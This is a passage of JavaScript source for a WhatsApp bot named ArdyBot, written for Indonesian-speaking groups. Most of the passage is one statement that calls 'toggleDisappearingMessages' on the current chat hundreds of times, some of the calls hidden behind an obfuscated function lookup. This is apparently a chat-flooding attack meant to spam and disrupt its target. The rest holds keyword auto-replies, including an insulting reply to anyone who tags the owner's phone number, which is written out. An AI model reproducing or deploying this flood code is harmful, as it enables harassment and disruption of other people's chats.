(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy['toggleDisappearingMessages'](from),Ardy['toggleDisappearingMessages'](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from),Ardy[_0xb34151(0x125)](from));
break     

case 'sc':
case 'sourcecode':
if (!isRegistered) return reply(ind.noregis())
reply('Bot  Script :\nhttps://github.com/MrChaby/ArdyBotV9')
break
				default:
            if (budy.includes(`assalamualaikum`)) {
                  reply(`Waalaikumsalam`)
                  }
		if (budy.includes(`Assalamualaikum`)) {
                  reply(`Waalaikumsalam`)
                  }
		if (budy.includes(`Thanks`)) {
                  reply(`Sama-sama ${pushname}`)
                  }
        if (budy.includes(`Ngemiss`)) {
                  const ceemde = fs.readFileSync('./src/sticker/dahjago.webp');
                  Ardy.sendMessage(from, ceemde, sticker)
                  }
        if (budy.includes(`ngemis`)) {
                  const ceemde = fs.readFileSync('./src/sticker/dahjago.webp');
                  Ardy.sendMessage(from, ceemde, sticker)
                  }
        if (budy.includes(`Ngemis`)) {
                  const ceemde = fs.readFileSync('./src/sticker/dahjago.webp');
                  Ardy.sendMessage(from, ceemde, sticker)
                  }
       if (budy.includes(`ngemiss`)) {
                  const ceemde = fs.readFileSync('./src/sticker/dahjago.webp');
                  Ardy.sendMessage(from, ceemde, sticker)
                  }
       if (budy.includes(`@6287863200063`)) {
                  const ceemde = fs.readFileSync('./src/sticker/dahjago.webp');
                  reply(`Jangan Tag Owner Gw Tai😼`)
                  Ardy.sendMessage(from, ceemde, sticker)
                  }
			if (isGroup && !isCmd && isSimi && budy != undefined) {
						console.log(budy)
						muehe = await simih(budy)
						reply(ind.cmdnf(prefix, command))
					} else {
						console.log(color('[ERROR]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
					}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
